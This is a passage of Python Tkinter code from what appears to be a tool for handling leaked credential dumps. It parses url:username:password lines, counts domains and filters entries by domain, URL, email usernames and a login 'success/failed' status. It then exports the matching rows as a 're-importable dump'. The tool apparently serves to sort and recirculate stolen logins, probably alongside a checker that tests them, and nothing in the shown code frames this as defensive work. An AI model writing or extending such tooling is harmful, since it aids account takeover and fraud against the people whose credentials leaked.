        btn_save = ttk.Button(top_bar, text="Save as Dump", state="disabled")
        btn_save.pack(side="right", padx=4)

        btn_copy = ttk.Button(top_bar, text="Copy All", state="disabled")
        btn_copy.pack(side="right", padx=4)

        frame = ttk.Frame(win)
        frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        lb = tk.Listbox(frame, selectmode="extended",
                        bg=C["surface"], fg=C["fg"],
                        selectbackground=C["accent"], selectforeground=C["bg"],
                        font=("Consolas", 10), activestyle="none", bd=0,
                        highlightthickness=0)
        sb = ttk.Scrollbar(frame, orient="vertical", command=lb.yview)
        lb.configure(yscrollcommand=sb.set)
        lb.pack(side="left", fill="both", expand=True)
        sb.pack(side="right", fill="y")

        # Will hold: [ [("domain.com", 12), ("abc.com", 5), ...] ]
        result_holder: list[list[tuple[str, int]]] = [[]]

        def _save_domains():
            domains = result_holder[0]
            if not domains:
                return
            path = filedialog.asksaveasfilename(
                parent=win,
                title="Save Domain Counts",
                defaultextension=".txt",
                filetypes=[("Text file", "*.txt")],
            )
            if not path:
                return
            try:
                with open(path, "w", encoding="utf-8") as f:
                    for domain, count in domains:
                        f.write(f"{domain} ({count})\n")
                messagebox.showinfo(
                    "Saved", f"Saved {len(domains):,} domains to:\n{path}",
                    parent=win)
            except Exception as exc:
                messagebox.showerror("Error", str(exc), parent=win)

        def _copy_domains():
            domains = result_holder[0]
            if domains:
                win.clipboard_clear()
                win.clipboard_append(
                    "\n".join(f"{domain} ({count})" for domain, count in domains)
                )

        btn_save.config(command=_save_domains)
        btn_copy.config(command=_copy_domains)

        # Status-bar search filter label
        filter_parts = []
        if domain_snap:
            filter_parts.append(f"domain={domain_snap!r}")
        if url_kw_snap:
            filter_parts.append(f"url={url_kw_snap!r}")
        if email_snap:
            filter_parts.append("emails-only")
        if status_f_snap != "All":
            filter_parts.append(f"status={status_f_snap!r}")
        filter_str = "  [" + ", ".join(filter_parts) + "]" if filter_parts else ""
        self._statusbar.config(text=f"Scanning domain counts{filter_str}…")

        # Snapshot byte-offset index and filter cache for the worker thread
        index_snap    = list(self._line_index) if self._line_index else None
        filtered_snap = None
        f_key = (domain_snap, url_kw_snap, email_snap)
        if (self._filtered_index is not None
                and self._filter_cache_key == f_key):
            filtered_snap = list(self._filtered_index)

        def _scan():
            domain_counts: dict[str, int] = defaultdict(int)

            try:
                if filtered_snap is not None and index_snap:
                    # Fastest: iterate only pre-filtered entries
                    with open(filepath, "rb") as fb:
                        for abs_idx in filtered_snap:
                            if abs_idx >= len(index_snap):
                                continue
                            fb.seek(index_snap[abs_idx])
                            raw   = fb.readline()
                            entry = parse_credential_line(
                                raw.decode("utf-8", errors="ignore"))
                            if entry is None:
                                continue
                            # Domain/url/email already filtered by cache;
                            # only status filter remains.
                            if status_f_snap and status_f_snap != "All":
                                status = results_snap.get(abs_idx, "Pending")
                                sl = status.lower()
                                sf = status_f_snap.lower()
                                if sf == "success" and "success" not in sl:
                                    continue
                                elif sf == "failed" and "failed" not in sl:
                                    continue
                                elif sf not in ("success", "failed") and sf not in sl:
                                    continue
                            domain_counts[entry["domain"].strip().lower()] += 1

                elif index_snap:
                    # Use byte-offset index for O(1) seek per line
                    with open(filepath, "rb") as fb:
                        for abs_idx, offset in enumerate(index_snap):
                            fb.seek(offset)
                            raw   = fb.readline()
                            entry = parse_credential_line(
                                raw.decode("utf-8", errors="ignore"))
                            if entry is None:
                                continue
                            if not _passes(entry, abs_idx):
                                continue
                            domain_counts[entry["domain"].strip().lower()] += 1

                else:
                    # Fallback: no index — scan linearly
                    abs_idx = 0
                    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                        for line in f:
                            entry = parse_credential_line(line)
                            if entry is None:
                                continue
                            current_idx = abs_idx
                            abs_idx += 1
                            if not _passes(entry, current_idx):
                                continue
                            domain_counts[entry["domain"].strip().lower()] += 1

            except Exception as exc:
                win.after(0, lambda e=exc: messagebox.showerror(
                    "Scan error", str(e), parent=win))
                return

            # Sort by count descending, then domain ascending
            domains = sorted(domain_counts.items(), key=lambda x: (-x[1], x[0]))
            result_holder[0] = domains

            def _populate():
                lb.delete(0, "end")
                for domain, count in domains:
                    lb.insert("end", f"{domain} ({count})")

                count_var.set(f"{len(domains):,} domains")
                btn_save.config(state="normal")
                btn_copy.config(state="normal")
                self._statusbar.config(
                    text=f"Domain count scan complete — {len(domains):,} domains found.")

            win.after(0, _populate)

        threading.Thread(target=_scan, daemon=True).start()
    def _save_dump(self):
        """Save filtered rows as re-importable dump: url:username:password"""
        if self._filepath is None:
            return
        path = filedialog.asksaveasfilename(
            title="Save as Dump",
            defaultextension=".txt",
            filetypes=[("Text file", "*.txt")],
        )
        if not path:
            return

        # Snapshot all filter state immediately on the main thread so the
        # worker thread never touches Tkinter variables directly.
        filepath     = self._filepath
        index_snap   = list(self._line_index)
        results_snap = dict(self._results)
        domain_kw    = self._domain_var.get().strip().lower()
        url_kw       = self._url_keyword_var.get().strip().lower()
        username_mode = self._username_filter_var.get()
        status_f     = self._status_filter.get()
        filter_key   = (domain_kw, url_kw, username_mode)
        filtered_snap = None
        if self._filtered_index is not None and self._filter_cache_key == filter_key:
            filtered_snap = list(self._filtered_index)

        self._statusbar.config(text="Saving dump…")
        self.update_idletasks()

        def _worker():
            try:
                written = 0
                BUF = 1 << 20  # 1 MiB write buffer
                with open(path, "w", encoding="utf-8", buffering=BUF) as out, \
                     open(filepath, "rb") as src:
                    lines: list[str] = []
                    index_iter = filtered_snap if filtered_snap is not None else range(len(index_snap))
                    for abs_idx in index_iter:
                        if abs_idx >= len(index_snap):
                            continue
                        offset = index_snap[abs_idx]
                        src.seek(offset)
                        raw   = src.readline()
                        entry = parse_credential_line(
                            raw.decode("utf-8", errors="ignore"))
                        if entry is None:
                            continue
                        # Apply domain / URL / username filters only when we do not
                        # already have a pre-filtered abs_idx list.
                        if filtered_snap is None:
                            e_url  = entry["url"].lower()
                            e_dom  = entry["domain"].lower()
                            e_user = entry["username"]
                            if domain_kw and domain_kw not in e_dom and domain_kw not in e_url:
                                continue
                            if url_kw and url_kw not in e_url:
                                continue
                            if not self._username_matches_filter(e_user, username_mode):
                                continue
                        # Apply status filter
                        status = results_snap.get(abs_idx, "Pending")
                        if not self._status_matches_filter(status, status_f):
                            continue
                        lines.append(
                            f'{entry["url"]}:{entry["username"]}:{entry["password"]}\n'
                        )
                        written += 1
                        # Flush every 50k rows to bound memory
                        if written % 50_000 == 0:
                            out.writelines(lines)
                            lines.clear()
                    if lines:
                        out.writelines(lines)
                self.after(0, lambda w=written: messagebox.showinfo(
                    "Dump Saved", f"Saved {w:,} rows to:\n{path}"))
            except Exception as exc:
                self.after(0, lambda e=exc: messagebox.showerror("Dump error", str(e)))
            finally:
                self.after(0, lambda: self._statusbar.config(text="Dump saved."))

        threading.Thread(target=_worker, daemon=True).start()

